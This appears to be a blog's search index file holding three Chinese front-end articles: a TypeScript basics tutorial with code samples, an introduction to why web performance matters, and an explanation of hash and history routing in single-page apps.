<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[TypeScript入门教程]]></title>
    <url>%2FTypeScript%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B.html</url>
    <content type="text"><![CDATA[本文是博主在学习TypeScript时跟着官方文档，自己写的例子，便于对知识点的掌握、梳理。 基础类型在Javascript中，声明的变量在被赋值前可以是任何数据类型，TypeScript中对变量的数据类型做了校验，一旦设置了指定的类型，变量就不能再被赋值其他类型的数据，这样更便于后期对变量的维护和查错。 布尔值1let flag: boolean = false; 数字1234let num1: number = 6;let num2: number = 0xf00d;let num3: number = 0b1010;let num4: number = 0o744; 字符串1234let str: string = 'Hello';let age: number = 1;let info: string = `I'm $&#123;age&#125; years old`; 数组12let list1: number[] = [1, 2, 3];let list2: Array&lt;number&gt; = [1, 2, 3]; 元组 Tuple12let x: [string, number];x = ['hello', 10]; 枚举默认情况下，从0开始为元素编号，但可以手动给编号，也可以通过编号获得他的名字1234567891011enum Flag1 &#123; success, fail &#125;let flag1:Flag1 = Flag1.fail;enum Flag2 &#123; success = 1, fail &#125;let flag2:Flag2 = Flag2.fail;enum Flag3 &#123; success = 1, fail = 3 &#125;let flag3:Flag3 = Flag3.fail;enum Flag4 &#123; success, fail &#125;let flag4: string = Flag4[1]; 任意值123let notSure: any = 4;notSure = "maybe a string instead";notSure = false; 空值用于函数时，指函数没有返回值；用于变量时，变量只能被赋值null或undefined1234function warnUser(): void &#123; alert("This is my warning message");&#125;let unusable: void = undefined; Null 和 Undefined12let u: undefined = undefined;let n: null = null; Never表示的是那些永不存在的值的类型。123function error(message: string): never &#123; throw new Error(message);&#125; 类型断言相当于其他语言中的类型转换。12345let someValue: any = "this is a string";let strLength: number = (&lt;string&gt;someValue).length;let someValue: any = "this is a string";let strLength: number = (someValue as string).length; 函数函数定义1234567891011function getInfo(name: string, age: number): string &#123; return `$&#123;name&#125;--$&#123;age&#125;`;&#125;var getInfo2 = function(name: string, age: number): string &#123; return `$&#123;name&#125;--$&#123;age&#125;`;&#125;// 书写完整函数类型var getInfo3: (name: string, age: number) =&gt; string = function(a: string, b: number): string &#123; return `$&#123;a&#125;--$&#123;b&#125;`;&#125; 可选参数可选参数必须放在参数最后面。1234var getDetail2 = function(name: string, age?: number): string &#123; return `$&#123;name&#125;--$&#123;age&#125;`;&#125;getDetail2('Bob'); 默认参数与普通可选参数不同的是，带默认值的参数不需要放在必须参数的后面。 如果带默认值的参数出现在必须参数前面，用户必须明确的传入undefined值来获得默认值。123456789function getTest(name: string, age: number = 20): string &#123; return `$&#123;name&#125;--$&#123;age&#125;`;&#125;getTest('Bob');function getTest2(name: string = 'Bob', age: number): string &#123; return `$&#123;name&#125;--$&#123;age&#125;`;&#125;getTest2(undefined, 13); 剩余参数1234567function sum (a: number, ...res: number[]): number &#123; var sum = 0; res.map(item =&gt; &#123; sum += item; &#125;); return sum;&#125; 函数重载12345678910111213141516171819function testInfo (name:string):string;function testInfo (age:number):string;function testInfo (str:any):any &#123; if (typeof str === 'string') &#123; return `Name:$&#123;str&#125;`; &#125; else &#123; return `Age:$&#123;str&#125;`; &#125;&#125;function testInfo2 (name:string):string;function testInfo2 (name:string, age:number):string;function testInfo2 (name:any, age?:any):any &#123; if (age) &#123; return `Name:$&#123;name&#125;,Age:$&#123;age&#125;`; &#125; else &#123; return `Name:$&#123;name&#125;`; &#125;&#125; 类定义1234567891011121314151617class Person &#123; name: string; constructor (name: string) &#123; this.name = name; &#125; run (): void &#123; console.log(`Name:$&#123;this.name&#125;`); &#125; getName (): string &#123; return this.name; &#125; setName (name: string): void &#123; this.name = name &#125;&#125;var p = new Person('Amy');p.setName('David') 继承1234567891011121314151617181920class Human &#123; name: string; constructor (name: string) &#123; this.name = name; &#125; run (): string &#123; return `Name:$&#123;this.name&#125;`; &#125;&#125;class Tiny extends Human &#123; constructor (name: string) &#123; super(name); &#125; work () &#123; console.log(`Hello,$&#123;this.name&#125;`) &#125;&#125;var t = new Tiny('Wang');console.log(t.run())t.work(); 修饰符 public：当前类，子类和外部均可访问 protect: 当前类，子类可访问，外部不可访问 private: 只在当前类可访问，子类和外部都不可访问123456789101112131415161718192021222324252627class Person &#123; public name: string; protect age: number; private gender: string; constructor (name: string, age: number, gender: string) &#123; this.name = name; this.age = age; this.gender = gender; &#125;&#125;class Adult extends Person&#123; constructor (name: string, age: number, gender: string) &#123; super(name, age, gender); &#125; print () &#123; console.log(this.name); console.log(this.age); console.log(this.gender); // 报错，不能访问 &#125;&#125;var a = new Adult('John', 13, 'female');var p = new Person('John', 13, 'female');console.log(a.name);console.log(a.gender); // 报错，不能访问console.log(p.age); // 报错，不能访问console.log(p.gender); // 报错，不能访问 readonly 修饰符使用readonly关键字将属性设置为只读的。 只读属性必须在声明时或构造函数里被初始化。123456789class Person &#123; readonly name: string; readonly age: number = 13; constructor (name: string) &#123; this.name = name; &#125;&#125;let p = new Person('John');p.name = 'Bob'; // 报错，属性只读 存取器只带有 get不带有 set的存取器自动被推断为 readonly。123456789101112131415class Person &#123; private _name: string; get name ():string &#123; return this._name; &#125; set name (name: string): void &#123; this._name = name; &#125;&#125;let p = new Person();p.name = "Bob";if (p.name) &#123; alert(p.name);&#125; 静态属性类的实例成员仅当类被实例化的时候才会被初始化。 创建类的静态成员，这些属性存在于类本身上面而不是类的实例上。1234567891011121314151617181920class Base &#123; public name: string; static age: number = 20; constructor (name: string) &#123; this.name = name &#125; run () &#123; console.log(`$&#123;this.name&#125; is running`) &#125; work () &#123; console.log(`$&#123;this.age&#125; is working`) // 不能访问静态属性 &#125; static print () &#123; // 静态方法只能访问类的静态属性 console.log(`This is static func:$&#123;this.age&#125;`); &#125;&#125;var b = new Base('Amy');b.run();console.log(Base.age); // 可以访问Base.print(); // 可以访问 多态继承类可以改写父类的方法。12345678910111213141516171819class Human &#123; name: string; constructor (name: string) &#123; this.name = name; &#125; run (): string &#123; return `Name:$&#123;this.name&#125;`; &#125;&#125;class Tiny extends Human &#123; constructor (name: string) &#123; super(name); &#125; run (): string &#123; return `This is Tiny's Name:$&#123;this.name&#125;`; &#125;&#125;var t = new Tiny('Wang');console.log(t.run()); // This is Tiny's Name:Wang 抽象类抽象类做为其它派生类的基类使用，一般不会直接被实例化。不同于接口，抽象类可以包含成员的实现细节，abstract关键字是用于定义抽象类和在抽象类内部定义抽象方法。1234567891011121314151617181920212223242526abstract class Animal &#123; public name: string; constructor (name:string) &#123; this.name = name &#125; abstract eat():any;&#125;class Rabbit extends Animal &#123; // 抽象类子类必须实现抽象方法 constructor (name:string) &#123; super(name); &#125; eat () &#123; console.log(`$&#123;this.name&#125; eat grass`) &#125; jump () &#123; console.log(`I'm jumpping`) &#125;&#125;var ani: Animal; // 允许创建一个对抽象类型的引用ani = new Animal('Bob'); // 错误: 不能创建一个抽象类的实例ani = new Rabbit('Bob'); // 允许对一个抽象子类进行实例化和赋值ani.eat();ani.jump(); // 错误: 方法在声明的抽象类中不存在 接口属性接口属性接口就是对传入参数的约束。1234function printLabel (labelInfo: &#123; label: string &#125;): void &#123; console.log(labelInfo.label);&#125;printLabel(&#123; label: '123' &#125;); 我们传入的对象参数实际上会包含很多属性，使用对象传入约束的方式，编译器只会检查那些必需的属性是否存在，并且其类型是否匹配。1234567891011121314interface FullName &#123; firstName: string; secondName: string;&#125;function printName (name: FullName) &#123; console.log(name.firstName + name.secondName);&#125;var obj = &#123; age: 20, firstName: 'Lei', secondName: 'Ming'&#125;printName(obj);printName(&#123; firstName: 'Amy',secondName:' cooper' &#125;); 可选属性12345678interface Info &#123; firstName: string; secondName?: string;&#125;function getName(info:Info) &#123; console.log(info.firstName)&#125;getName(&#123; firstName: 'Amy' &#125;); 结合可选属性，实现ajax函数：123456789101112131415161718192021222324interface Config &#123; type: string; url: string; data?: string; dataType: string;&#125;function ajax (config: Config) &#123; var xhr = new XMLHttpRequest(); xhr.open(config.type, config.url); xhr.send(config.data); xhr.onreadystatechange = function () &#123; if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) &#123; if (config.dataType === 'json') &#123; return JSON.parse(xhr.responseText); &#125; return xhr.responseText; &#125; &#125;&#125;ajax(&#123; type: 'get', url: 'https://www.baidu.com', dataType: 'json'&#125;) 只读属性只读属性只能在对象刚刚创建的时候修改其值。123456interface Point &#123; readonly x: number; readonly y: number;&#125;var p: Point = &#123; x: 10, y: 20 &#125;;p.x = 5; // 错误，只读属性不可修改 TypeScript具有ReadonlyArray类型，它与Array相似，只是把所有可变方法去掉了，因此可以确保数组创建后再也不能被修改。123456let a: number[] = [1, 2, 3, 4];let ro: ReadonlyArray&lt;number&gt; = a;ro[0] = 12; // 错误不能修改ro.push(5); // 错误不能修改ro.length = 100; // 错误不能修改a = ro; // 错误不能修改 最简单判断该用readonly还是const的方法是看要把它做为变量使用还是做为一个属性。 做为变量使用的话用 const，若做为属性则使用readonly。 函数类型接口123456interface encrypt &#123; (key: string, value: string): string;&#125;var md5: encrypt = function (key: string, value: string): string &#123; return key + value;&#125; 可索引接口TypeScript支持两种索引签名：字符串和数字。123456789interface UserArr &#123; [index: number]: string;&#125;var arr3: UserArr = ['aa', 'bb'];interface UserObj &#123; [index: string]: string;&#125;var objArr: UserObj =&#123;name:'Jon', age: '2'&#125; 类类型接口12345678910111213141516171819202122interface Animal &#123; name: string; eat (str: string): void;&#125;class Pig implements Animal &#123; name: string; constructor(name: string) &#123; this.name = name &#125; eat () &#123; console.log(`This is pig`) &#125;&#125;class Elephan implements Animal &#123; name: string; constructor(name: string) &#123; this.name = name; &#125; eat (food: string) &#123; console.log(`Eat $&#123;food&#125;`); &#125;&#125; 继承接口一个接口可以继承多个接口，创建出多个接口的合成接口。12345678910111213interface Animal &#123; name: string;&#125;interface Cute &#123; level: string;&#125;interface Rabbit extends Animal, Cute &#123; age: number;&#125;var rab = &lt;Rabbit&gt;&#123;&#125;;rab.name = 'Haru';rab.level = 'cutest';rab.age = 1 接口继承类123456789101112131415161718192021222324252627282930interface PP &#123; eat(): void;&#125;interface P2 extends PP &#123; work(): void;&#125;class Programmer &#123; name: string; constructor(name: string) &#123; this.name = name; &#125; coding(code: string) &#123; console.log(this.name + code); &#125;&#125;class Web extends Programmer implements P2&#123; constructor(name: string) &#123; super(name); &#125; eat() &#123; console.log(`Eating`) &#125; work() &#123; console.log(`Working`); &#125;&#125;var ww = new Web('Sara');ww.eat()ww.work()ww.coding(' python') 泛型使用1234function getData&lt;T&gt; (value: T): T &#123; return value;&#125;getData&lt;number&gt;(123); 泛型类1234567891011121314151617181920class MinClass&lt;T&gt; &#123; public list: T[] = []; add (num: T): void &#123; this.list.push(num) &#125; min (): T &#123; var minNum = this.list[0] for (var i = 0; i &lt; this.list.length; i++) &#123; if (minNum &gt; this.list[i]) &#123; minNum = this.list[i]; &#125; &#125; return minNum; &#125;&#125;var m = new MinClass&lt;number&gt;();m.add(9);m.add(3);m.add(5);console.log(m.min()); 泛型接口1234567891011121314151617181920212223242526272829303132// 方法一：interface ConfigFn &#123; &lt;T&gt;(val: T): T;&#125;var getDa: ConfigFn = function&lt;T&gt;(val: T): T &#123; return val;&#125;getDa&lt;number&gt;(13);// 方法二：interface ConfigFn2&lt;T&gt; &#123; (val: T): T;&#125;function getDa2&lt;T&gt;(val: T): T &#123; return val;&#125;var myGetDa: ConfigFn2&lt;string&gt; = getDa2;var myGetDa2: ConfigFn2&lt;string&gt; = function&lt;T&gt;(val: T): T &#123; return val;&#125;myGetDa('13');myGetDa2('12');// 在泛型中继承接口interface ConfigFn3 &#123; length: number;&#125;function myGetDa3&lt;T extends ConfigFn3&gt;(arg: T): T &#123; return arg;&#125;myGetDa3(3); // 错误，传入参数有限制myGetDa3(&#123;length: 10, value: 3&#125;); // 成功 实例利用泛型实现一个数据库类。1234567891011121314151617181920212223242526272829303132333435363738interface DBI&lt;T&gt; &#123; add(info:T): boolean; update(info:T, id:number): boolean; delete(id:number): boolean; get(id:number):any[];&#125;export class MysqlDb&lt;T&gt; implements DBI&lt;T&gt; &#123; constructor() &#123; console.log(`Connecting DB`); &#125; add(info: T): boolean &#123; console.log(info); return true; &#125; update(info: T, id: number): boolean &#123; throw new Error("Method not implemented."); &#125; delete(id: number): boolean &#123; throw new Error("Method not implemented."); &#125; get(id: number): any[] &#123; throw new Error("Method not implemented."); &#125;&#125;export class MssqlDb&lt;T&gt; implements DBI&lt;T&gt; &#123; add(info: T): boolean &#123; throw new Error("Method not implemented."); &#125; update(info: T, id: number): boolean &#123; throw new Error("Method not implemented."); &#125; delete(id: number): boolean &#123; throw new Error("Method not implemented."); &#125; get(id: number): any[] &#123; throw new Error("Method not implemented."); &#125;&#125; 高级类型交叉类型使用&amp;合并两个类，这让我们可以把现有的多种类型叠加到一起成为一种类型，它包含了所需的所有类型的特性。12345678910111213141516171819202122232425function extend&lt;T, U&gt;(first: T, second: U): T &amp; U &#123; let result = &lt;T &amp; U&gt;&#123;&#125;; for (let id in first) &#123; (&lt;any&gt;result)[id] = (&lt;any&gt;first)[id]; &#125; for (let id in second) &#123; if (!result.hasOwnProperty(id)) &#123; (&lt;any&gt;result)[id] = (&lt;any&gt;second)[id]; &#125; &#125; return result;&#125;class Person &#123; constructor(public name: string) &#123; &#125;&#125;interface Loggable &#123; log(): void;&#125;class ConsoleLogger implements Loggable &#123; log() &#123;&#125;&#125;var jim = extend(new Person("Jim"), new ConsoleLogger());var n = jim.name;jim.log(); 联合类型1234let uniType: string | number;uniType = 1; // 正确uniType = '2'; // 正确uniType = true; // 错误 如果一个值是联合类型，我们只能访问此联合类型的所有类型里共有的成员。1234567891011121314interface Bird &#123; fly(); layEggs();&#125;interface Fish &#123; swim(); layEggs();&#125;function getSmallPet(): Fish | Bird &#123;&#125;let pet = getSmallPet();pet.layEggs(); // 正确pet.swim(); // 错误 类型别名类型别名会给一个类型起个新名字。 类型别名有时和接口很像，但是可以作用于原始值，联合类型，元组以及其它任何你需要手写的类型。 起别名不会新建一个类型 - 它创建了一个新名字来引用那个类型。1234567891011121314151617// 可以使用类型别名来在属性里引用自己type Tree&lt;T&gt; = &#123; value: T; left: Tree&lt;T&gt;; right: Tree&lt;T&gt;;&#125;// 与交叉类型一起使用type LinkedList&lt;T&gt; = T &amp; &#123; next: LinkedList&lt;T&gt; &#125;;interface Person &#123; name: string;&#125;var people: LinkedList&lt;Person&gt;;var s = people.name;var s = people.next.name;var s = people.next.next.name;var s = people.next.next.next.name; 使用注意： 类型别名不能被 extends和 implements（自己也不能 extends和 implements其它类型）。 如果你无法通过接口来描述一个类型并且需要使用联合类型或元组类型，这时通常会使用类型别名。 字符串字面量类型123456789101112type Easing = "ease-in" | "ease-out" | "ease-in-out";class UIElement &#123; animate(dx: number, dy: number, easing: Easing) &#123; if (easing === "ease-in") &#123;&#125; else if (easing === "ease-out") &#123;&#125; else if (easing === "ease-in-out") else &#123;&#125; &#125;&#125;let button = new UIElement();button.animate(0, 0, "ease-in");button.animate(0, 0, "uneasy"); 数字字面量类型1function rollDie(): 1 | 2 | 3 | 4 | 5 | 6 &#123;&#125; 可辨识联合它具有3个要素： 具有普通的单例类型属性— 可辨识的特征。 一个类型别名包含了那些类型的联合— 联合。 此属性上的类型保护。 1234567891011121314151617181920212223242526interface Square &#123; kind: "square"; size: number;&#125;interface Rectangle &#123; kind: "rectangle"; width: number; height: number;&#125;interface Circle &#123; kind: "circle"; radius: number;&#125;type Shape = Square | Rectangle | Circle | Triangle;function assertNever(x: never): never &#123; throw new Error("Unexpected object: " + x);&#125;function area(s: Shape) &#123; switch (s.kind) &#123; case "square": return s.size * s.size; case "rectangle": return s.height * s.width; case "circle": return Math.PI * s.radius ** 2; default: return assertNever(s); &#125;&#125; 多态的this类型使用了this类型，你可以继承它，新的类可以直接使用之前的方法，不需要做任何的改变。123456789101112131415161718192021222324252627282930class BasicCalculator &#123; public constructor(protected value: number = 0) &#123; &#125; public currentValue(): number &#123; return this.value; &#125; public add(operand: number): this &#123; this.value += operand; return this; &#125; public multiply(operand: number): this &#123; this.value *= operand; return this; &#125;&#125;class ScientificCalculator extends BasicCalculator &#123; public constructor(value = 0) &#123; super(value); &#125; public sin() &#123; this.value = Math.sin(this.value); return this; &#125;&#125;let v = new ScientificCalculator(2) .multiply(5) .sin() .add(1) .currentValue(); 索引类型123456789101112131415161718// JS版本function pluck(o, names) &#123; return names.map(n =&gt; o[n]);&#125;// TS版本function pluck&lt;T, K extends keyof T&gt;(o: T, names: K[]): T[K][] &#123; return names.map(n =&gt; o[n]);interface Person &#123; name: string; age: number;&#125;let person: Person = &#123; name: 'Jarid', age: 35&#125;;let strings: string[] = pluck(person, ['name']); TS中为了检测属性是否存在类中，引入了几个类型操作符： keyof T：索引类型查询操作符。 T[K]：索引访问操作符。 映射类型TypeScript提供了从旧类型中创建新类型的一种方式 — 映射类型。 在映射类型里，新类型以相同的形式去转换旧类型里每个属性。123456type Readonly&lt;T&gt; = &#123; readonly [P in keyof T]: T[P];&#125;type Partial&lt;T&gt; = &#123; [P in keyof T]?: T[P];&#125; 命名空间1234567namespace A &#123; export class UserInfo &#123; username: string | undefined; password: string | undefined; &#125;&#125;var user = new A.UserInfo() 别名这里的语法是为指定的符号创建一个别名。 你可以用这种方法为任意标识符创建别名，也包括导入的模块中的对象。123456789namespace Shapes &#123; export namespace Polygons &#123; export class Triangle &#123; &#125; export class Square &#123; &#125; &#125;&#125;import polygons = Shapes.Polygons;let sq = new polygons.Square(); 装饰器类中不同声明上的装饰器将按以下规定的顺序应用： 参数装饰器，然后依次是方法装饰器，访问符装饰器，或属性装饰器应用到每个实例成员。 参数装饰器，然后依次是方法装饰器，访问符装饰器，或属性装饰器应用到每个静态成员。 参数装饰器应用到构造函数。 类装饰器应用到类。 类装饰器类装饰器应用于类构造函数，可以用来监视，修改或替换类定义。1234567891011121314151617181920212223242526// 无参数function logClass(params: any) &#123; console.log(params); params.prototype.apiUrl = 'http://xxx.com';&#125;@logClassclass HttpClient &#123; constructor () &#123;&#125; getData () &#123;&#125;&#125;var http = new HttpClient();console.log(http.apiUrl); // http://xxx.com// 传参数function logClass2(params: any) &#123; return function(target: any) &#123; target.prototype.apiUrl = params; &#125;&#125;@logClass2('hello')class HelloClient &#123; constructor() &#123;&#125; getData() &#123;&#125;&#125;var hell = new HelloClient();console.log(hell); // &#123; apiUrl: 'hello', getData: f() &#125; 方法装饰器被应用到方法的属性描述符上，可以用来监视，修改或者替换方法定义。 可以接受下列3个参数： 对于静态成员来说是类的构造函数，对于实例成员是类的原型对象。 成员的名字。 成员的属性描述符。1234567891011121314151617181920class Greet &#123; greeting: string; constructor (message: string) &#123; this.greeting = message; &#125; @enumerable(false) greet(): string &#123; return `Greeting $&#123;this.greeting&#125;`; &#125;&#125;function enumerable (val: boolean) &#123; return function (target: any, propertyKey: string, descriptor: PropertyDescriptor) &#123; descriptor.enumerable = val; &#125;&#125;var g = new Greet('John');console.log(Object.getOwnDescriptorProperty(g, 'greet')); // &#123;// enumerable: false// &#125; 访问器装饰器访问器装饰器应用于访问器的 属性描述符并且可以用来监视，修改或替换一个访问器的定义，使用和方法装饰器相同。 注意：TypeScript不允许同时装饰一个成员的get和set访问器。取而代之的是，一个成员的所有装饰的必须应用在文档顺序的第一个访问器上。 1234567891011121314151617class Point &#123; private _x: number; private _y: number; constructor(x: number, y: number) &#123; this._x = x; this._y = y; &#125; @configurable(false) get x() &#123; return this._x; &#125; @configurable(false) get y() &#123; return this._y; &#125;&#125;function configurable(value: boolean) &#123; return function (target: any, propertyKey: string, descriptor: PropertyDescriptor) &#123; descriptor.configurable = value; &#125;;&#125; 属性装饰器1234567891011function logProperty(params: any) &#123; return function(target: any, attr: any) &#123; target[attr] = params &#125;&#125;class Https &#123; @logProperty('http://2222.com') public url: any | undefined;&#125;var https = new Https();console.log(https); // &#123; url: "http://2222.com" &#125; 参数装饰器参数装饰器声明在一个参数声明之前（紧靠着参数声明）。可以传入三个参数： 对于静态成员来说是类的构造函数，对于实例成员是类的原型对象。 成员的名字。 参数在函数参数列表中的索引。 12345678910class Greeter &#123; greeting: string; constructor(message: string) &#123; this.greeting = message; &#125; @validate greet(@required name: string) &#123; return "Hello " + name + ", " + this.greeting; &#125;&#125; 三斜线指令三斜线指令仅可放在包含它的文件的最顶端。 一个三斜线指令的前面只能出现单行或多行注释，这包括其它的三斜线指令。 如果它们出现在一个语句或声明之后，那么它们会被当做普通的单行注释，并且不具有特殊的涵义。1/// &lt;reference path="..." /&gt; 三斜线引用告诉编译器在编译过程中要引入的额外的文件。 使用注意： 预处理输入文件：编译器会对输入文件进行预处理来解析所有三斜线引用指令。 错误：引用不存在的文件会报错。 使用 –noResolve：如果指定了–noResolve编译选项，三斜线引用会被忽略。]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手把手教你搭个前端性能监测系统]]></title>
    <url>%2F%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0%E6%90%AD%E4%B8%AA%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E7%9B%91%E6%B5%8B%E7%B3%BB%E7%BB%9F.html</url>
    <content type="text"><![CDATA[众所周知，一个网站的好坏，除了和页面的展示交互息息相关外，更离不开优秀的性能表现，当然网站的安全性也至关重要，尤其是针对涉及交易的网站，而本文将致力于探索网站的性能，一同打开前端性能的大门。 为何性能如此重要既然我们关注网站的性能，就需要知道性能为何重要。 性能关乎用户的去留性能在任何在线业务的成功方面都扮演重要角色。 以下是一些案例研究，显示了性能出色的网站与性能较差的网站相比，如何更好地与用户互动并留住用户： 性能 收益 Pinterest感知等待时间减少40% 搜索引擎流量和注册人数增长15% COOK页面平均加载时间减少850ms 转化率提升7%、跳出率下降7%，每次会话浏览页数增加10% BBC网站加载时间每增加一秒 失去10%的用户 Google页面加载时间超过3秒 53%的移动网站访问活动将遭到抛弃 Google 研究还表明，与加载时间约为四倍（19秒）的网站相比，加载时间在5秒以内的网站会话加长70%、跳出率下降35%、广告可见率上升25%。 性能关乎转化率的提升留住用户对于提升转化率至关重要。 响应速度慢会对网站收入带来不利影响，反之亦然。 以下是一些示例，显示了性能在提升业务收入方面扮演怎样的角色： 性能 收益 首页加载时间每减少100毫秒 基于会话的转化率增加1.11% 结账页面加载时间减少100毫秒 基于会话的转化率增加1.55% 页面加载时间减少一半 销售额提升12-13% 性能关乎用户性能低的网站和应用会导致用户产生实际成本。随着典型页面发送的数据增多，用户必须经常为其按流量计费的数据流量续费，如此一来，用户的成本便会增加。除了为用户省钱，速度快、负荷轻的用户体验对处在危机中的用户同样至关重要。 医院、诊所和危机中心等公共资源提供各类在线资源，以为用户提供面临危机时需要的特定重要信息。虽然紧急情况下设计在高效展示重要信息中扮演非常重要的角色，但快速传达此类信息的重要性同样不可低估。 综上，性能的重要性可见一斑。接下来我们就开始搭建前端性能监测系统，虽然市面上已经有不少这类检测的插件和网站，但是我认为不管是学习什么知识，自己亲手实践一下都能帮助你更好的理解和掌握，所以我们赶快开始吧。 参考链接： Why Performance Matters]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>性能</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端两种路由实现和使用场景]]></title>
    <url>%2F%E5%89%8D%E7%AB%AF%E4%B8%A4%E7%A7%8D%E8%B7%AF%E7%94%B1%E5%AE%9E%E7%8E%B0%E5%92%8C%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF.html</url>
    <content type="text"><![CDATA[在学习vue-router时，了解到前端路由的两种模式，本文就前端路由，及其两种模式的原理和使用场景，做一个整理总结。 前端路由概述什么是路由路由这个概念最先是后端出现的，简单来说路由就是用来跟后端服务器进行交互的一种方式，通过不同的路径，来请求不同的资源，请求不同的页面是路由的其中一种功能。 前端路由的诞生前端路由的出现要从 ajax 开始，有了 Ajax 后，用户交互就不用每次都刷新页面，体验带来了极大的提升。随着技术的发展，简单的异步已经不能满足需求，所以异步的更高级体验出现了——SPA(单页应用)。SPA 的出现大大提高了 WEB 应用的交互体验。在与用户的交互过程中，不再需要重新刷新页面，获取数据也是通过 Ajax 异步获取，页面显示变的更加流畅。但由于 SPA 中用户的交互是通过 JS 改变 HTML 内容来实现的，页面本身的 url 并没有变化，这导致了两个问题： SPA 无法记住用户的操作记录，无论是刷新、前进还是后退，都无法展示用户真实的期望内容。 SPA 中虽然由于业务的不同会有多种页面展示形式，但只有一个 url，对 SEO 不友好，不方便搜索引擎进行收录。 前端路由就是为了解决上述问题而出现的。 什么是前端路由简单的说，就是在保证只有一个 HTML 页面，且与用户交互时不刷新和跳转页面的同时，为 SPA 中的每个视图展示形式匹配一个特殊的 url。在刷新、前进、后退和SEO时均通过这个特殊的 url 来实现。为实现这一目标，我们需要做到以下二点： 改变 url 且不让浏览器像服务器发送请求。 可以监听到 url 的变化 接下来要介绍的 hash 模式和 history 模式，就是实现了上面的功能。 Hash模式原理 早期的前端路由的实现就是基于location.hash来实现的，location.hash的值就是URL中#后面的内容其实现原理就是监听#后面的内容来发起Ajax请求来进行局部更新，而不需要刷新整个页面。 使用hashchange事件来监听 URL 的变化，以下这几种情况改变 URL 都会触发 hashchange 事件：浏览器前进后退改变 URL、a标签改变 URL、window.location改变URL。 使用123456789101112131415161718192021222324252627282930313233//html&lt;ul id=&quot;menu&quot;&gt; &lt;li&gt; &lt;a href=&quot;#index&quot;&gt;首页&lt;/a&gt; &lt;/li&gt; &lt;li&gt; &lt;a href=&quot;#news&quot;&gt;资讯&lt;/a&gt; &lt;/li&gt; &lt;li&gt; &lt;a href=&quot;#user&quot;&gt;个人中心&lt;/a&gt; &lt;/li&gt;&lt;/ul&gt;&lt;div id=&quot;app&quot;&gt;&lt;/div&gt;//jsfunction hashChange(e)&#123; let app = document.getElementById(&apos;app&apos;) switch (location.hash) &#123; case &apos;#index&apos;: app.innerHTML = &apos;&lt;h1&gt;这是首页内容&lt;/h1&gt;&apos; break case &apos;#news&apos;: app.innerHTML = &apos;&lt;h1&gt;这是新闻内容&lt;/h1&gt;&apos; break case &apos;#user&apos;: app.innerHTML = &apos;&lt;h1&gt;这是个人中心内容&lt;/h1&gt;&apos; break default: app.innerHTML = &apos;&lt;h1&gt;404&lt;/h1&gt;&apos; &#125;&#125;window.onhashchange = hashChangehashChange() 优点 兼容低版本浏览器，Angular1.x和Vue默认使用的就是hash路由 只有#符号之前的内容才会包含在请求中被发送到后端，也就是说就算后端没有对路由全覆盖，但是不会返回404错误 hash值的改变，都会在浏览器的访问历史中增加一个记录，所以可以通过浏览器的回退、前进按钮控制hash的切换会覆盖锚点定位元素的功能 缺点 不太美观，#后面传输的数据复杂的话会出现问题 History模式原理 history 提供了 pushState 和 replaceState 两个方法来记录路由状态，这两个方法改变 URL 不会引起页面刷新 history 提供类似 hashchange 事件的 popstate 事件，但 popstate 事件有些不同：通过浏览器前进后退改变 URL 时会触发 popstate 事件，通过pushState/replaceState或a标签改变 URL 不会触发 popstate 事件。好在我们可以拦截 pushState/replaceState的调用和a标签的点击事件来检测 URL 变化，所以监听 URL 变化可以实现，只是没有 hashchange 那么方便。 pushState(state, title, url) 和 replaceState(state, title, url)都可以接受三个相同的参数。 使用1234567891011121314151617181920212223242526272829303132333435363738394041424344//html&lt;ul id=&quot;menu&quot;&gt; &lt;li&gt; &lt;a href=&quot;/index&quot;&gt;首页&lt;/a&gt; &lt;/li&gt; &lt;li&gt; &lt;a href=&quot;/news&quot;&gt;资讯&lt;/a&gt; &lt;/li&gt; &lt;li&gt; &lt;a href=&quot;/user&quot;&gt;个人中心&lt;/a&gt; &lt;/li&gt;&lt;/ul&gt;&lt;div id=&quot;app&quot;&gt;&lt;/div&gt;//jsdocument.querySelector(&apos;#menu&apos;).addEventListener(&apos;click&apos;,function (e) &#123; if(e.target.nodeName ===&apos;A&apos;)&#123; e.preventDefault() let path = e.target.getAttribute(&apos;href&apos;) //获取超链接的href，改为pushState跳转，不刷新页面 window.history.pushState(&#123;&#125;,&apos;&apos;,path) //修改浏览器中显示的url地址 render(path) //根据path，更改页面内容 &#125;&#125;)function render(path) &#123; let app = document.getElementById(&apos;app&apos;) switch (path) &#123; case &apos;/index&apos;: app.innerHTML = &apos;&lt;h1&gt;这是首页内容&lt;/h1&gt;&apos; break case &apos;/news&apos;: app.innerHTML = &apos;&lt;h1&gt;这是新闻内容&lt;/h1&gt;&apos; break case &apos;/user&apos;: app.innerHTML = &apos;&lt;h1&gt;这是个人中心内容&lt;/h1&gt;&apos; break default: app.innerHTML = &apos;&lt;h1&gt;404&lt;/h1&gt;&apos; &#125;&#125;window.onpopstate = function (e) &#123; render(location.pathname)&#125;render(&apos;/index&apos;) 优点 使用简单，比较美观 pushState()设置新的URL可以是任意与当前URL同源的URL，而hash只能改变#后面的内容，因此只能设置与当前URL同文档的URL pushState()设置的URL与当前URL一模一样时也会被添加到历史记录栈中，而hash#后面的内容必须被修改才会被添加到新的记录栈中 pushState()可以通过stateObject参数添加任意类型的数据到记录中，而hash只能添加短字符串 pushState()可额外设置title属性供后续使用 缺点 前端的URL必须和向发送请求后端URL保持一致，否则会报404错误 由于History API的缘故，低版本浏览器有兼容行问题 两种不同使用场景 从上文可见，hash模式下url会带有#，当你希望url更优雅时，可以使用history模式。 当使用history模式时，需要注意在服务端增加一个覆盖所有情况的候选资源：如果 URL 匹配不到任何静态资源，则应该返回同一个 index.html 页面，这个页面就是你 app 依赖的页面。 当需要兼容低版本的浏览器时，建议使用hash模式。 当需要添加任意类型数据到记录时，可以使用history模式。 参考链接： 前端框架路由实现 前端路由的两种模式 两种前端路由（hash模式和history模式）实现原理解析及区别]]></content>
      <categories>
